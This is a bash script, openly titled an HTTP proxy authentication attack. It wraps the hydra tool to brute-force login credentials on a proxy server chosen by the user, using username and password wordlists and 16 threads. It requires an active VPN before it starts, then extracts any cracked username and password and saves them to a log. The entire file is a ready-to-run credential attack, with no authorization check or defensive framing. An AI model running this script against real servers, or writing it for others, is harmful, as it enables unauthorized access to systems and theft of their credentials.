#!/bin/bash

# HTTP Proxy Authentication Attack Script
# Description: Attacks HTTP proxy servers requiring authentication
# Usage: Edit TARGET and PORT variables and run

set -euo pipefail

# ============================================
# CONFIGURATION - EDIT ONLY THESE LINES
# ============================================
TARGET="proxy.example.com"  # <-- Change this to your proxy server
PORT="8080"                 # <-- Change this to proxy port (usually 8080, 3128, 8888)

# ============================================
# DO NOT EDIT BELOW THIS LINE
# ============================================

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Configuration
PROJECT_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
WORDLIST="${PROJECT_ROOT}/config/admin_passwords.txt"
USERNAMES="${PROJECT_ROOT}/config/admin_usernames.txt"
THREADS=16
LOG_FILE="${HOME}/hydra-logs/http_proxy_$(date +%Y%m%d_%H%M%S).log"

# Banner
echo -e "${BLUE}"
echo "╔════════════════════════════════════════╗"
echo "║   HTTP Proxy Authentication Attack    ║"
echo "║   Target: $TARGET:$PORT"
echo "╚════════════════════════════════════════╝"
echo -e "${NC}"

# Check VPN
if [ -f "${PROJECT_ROOT}/scripts/vpn_check.sh" ]; then
    bash "${PROJECT_ROOT}/scripts/vpn_check.sh" || {
        echo -e "${YELLOW}[!] VPN not active${NC}"
        exit 1
    }
fi

# Check hydra
if ! command -v hydra &> /dev/null; then
    echo -e "${RED}[!] Hydra not found. Run: bash install.sh${NC}"
    exit 1
fi

# Create log directory
mkdir -p "$(dirname "$LOG_FILE")"

echo -e "${BLUE}[*] Starting HTTP Proxy attack...${NC}"
echo -e "${BLUE}[*] Target: $TARGET:$PORT${NC}"
echo -e "${BLUE}[*] Threads: $THREADS${NC}"

# Run hydra attack
hydra -L "$USERNAMES" -P "$WORDLIST" \
    -t "$THREADS" \
    -s "$PORT" \
    -f \
    -o "$LOG_FILE" \
    "$TARGET" \
    http-proxy 2>&1 | while IFS= read -r line; do
    
    echo "$line"
    
    if echo "$line" | grep -q "login:"; then
        username=$(echo "$line" | sed -n 's/.*login: \([^ ]*\).*/\1/p')
        password=$(echo "$line" | sed -n 's/.*password: \(.*\)/\1/p')
        
        echo -e "${GREEN}[+] SUCCESS! Proxy credentials:${NC}"
        echo -e "${GREEN}    Username: $username${NC}"
        echo -e "${GREEN}    Password: $password${NC}"
        
        if [ -f "${PROJECT_ROOT}/scripts/logger.sh" ]; then
            source "${PROJECT_ROOT}/scripts/logger.sh"
            save_result "http-proxy" "$TARGET" "$PORT" "$username" "$password"
        fi
    fi
done

echo -e "${GREEN}[+] Attack completed!${NC}"
